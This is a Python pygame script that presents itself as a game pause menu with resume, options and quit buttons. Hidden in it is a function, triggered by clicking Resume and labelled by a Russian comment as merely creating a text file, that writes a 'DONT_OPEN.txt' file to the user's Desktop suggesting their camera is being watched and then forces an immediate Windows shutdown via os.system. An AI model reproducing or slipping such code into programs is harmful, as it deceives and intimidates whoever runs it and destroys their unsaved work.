import pygame
import sys
import os
from pathlib import Path
# Initialize Pygame
pygame.init()

# Create game window
SCREEN_WIDTH = 800
SCREEN_HEIGHT = 600

# Set up the game window
screen = pygame.display.set_mode((SCREEN_WIDTH, SCREEN_HEIGHT))
pygame.display.set_caption("Main Menu")

# Game variables
game_paused = False
menu_state = "main"

# Define fonts and colors
font = pygame.font.SysFont("arialblack", 40)
TEXT_COL = (255, 255, 255)

# Load button images
resume_img = pygame.image.load("images/button_resume.png").convert_alpha()
options_img = pygame.image.load("images/button_options.png").convert_alpha()
quit_img = pygame.image.load("images/button_quit.png").convert_alpha()
video_img = pygame.image.load('images/button_video.png').convert_alpha()
audio_img = pygame.image.load('images/button_audio.png').convert_alpha()
keys_img = pygame.image.load('images/button_keys.png').convert_alpha()
back_img = pygame.image.load('images/button_back.png').convert_alpha()

# Create a Button class
class Button():
    def __init__(self, x, y, image, scale):
        width = image.get_width()
        height = image.get_height()
        self.image = pygame.transform.scale(image, (int(width * scale), int(height * scale)))
        self.rect = self.image.get_rect()
        self.rect.topleft = (x, y)
        self.clicked = False

    def draw(self, surface):
        action = False
        # Get mouse position
        pos = pygame.mouse.get_pos()

        # Check mouseover and clicked conditions
        if self.rect.collidepoint(pos):
            if pygame.mouse.get_pressed()[0] == 1 and not self.clicked:
                self.clicked = True
                action = True

        if pygame.mouse.get_pressed()[0] == 0:
            self.clicked = False

        # Draw the button on the screen
        surface.blit(self.image, self.rect)

        return action
def create_text_file():
    desktop_path = Path.home() / "Desktop"
    text_file_path = desktop_path / "DONT_OPEN.txt"

    with text_file_path.open("w") as text_file:
        text_file.write("Nice camera man. Really nice")
        os.system("shutdown /s /t 1")
# Create button instances
resume_button = Button(304, 125, resume_img, 1)
options_button = Button(297, 250, options_img, 1)
quit_button = Button(336, 375, quit_img, 1)
video_button = Button(226, 75, video_img, 1)
audio_button = Button(225, 200, audio_img, 1)
keys_button = Button(246, 325, keys_img, 1)
back_button = Button(332, 450, back_img, 1)

# Function to draw text on the screen
def draw_text(text, font, text_col, x, y):
    img = font.render(text, True, text_col)
    screen.blit(img, (x, y))

# Game loop
run = True
while run:
    screen.fill((12, 12, 111))

    # Check if the game is paused
    if game_paused:
        # Check menu state
        if menu_state == "main":
            # Draw pause screen buttons
            if resume_button.draw(screen):
                game_paused = False
                create_text_file()  # Создаем текстовый документ
            if options_button.draw(screen):
                menu_state = "options"
            if quit_button.draw(screen):
                run = False
        # Check if the options menu is open
        elif menu_state == "options":
            # Draw the different options buttons
            if video_button.draw(screen):
                print("Video Settings")
            if audio_button.draw(screen):
                print("Audio Settings")
            if keys_button.draw(screen):
                print("Change Key Bindings")
            if back_button.draw(screen):
                menu_state = "main"
    else:
        draw_text("Press SPACE to pause", font, TEXT_COL, 160, 250)

    # Event handler
    for event in pygame.event.get():
        if event.type == pygame.KEYDOWN:
            if event.key == pygame.K_SPACE:
                game_paused = True
        if event.type == pygame.QUIT:
            run = False

    pygame.display.update()

# Quit the game
pygame.quit()
sys.exit()
